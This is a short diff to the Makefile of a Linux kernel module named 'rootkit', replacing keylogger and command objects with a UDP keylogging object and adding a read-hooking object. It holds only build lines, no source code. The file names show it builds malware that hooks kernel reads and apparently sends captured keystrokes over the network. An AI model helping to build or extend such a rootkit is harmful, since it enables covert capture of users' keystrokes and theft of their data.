@@ -1,8 +1,8 @@
 obj-m = rootkit.o
 
-rootkit-objs += keylogger.o
-rootkit-objs += commands.o
+rootkit-objs += keylogging_udp.o
 rootkit-objs += hooking.o
+rootkit-objs += read_hooking.o
 rootkit-objs += mod.o
 
 KERNELBUILD = /lib/modules/$(shell uname -r)/build
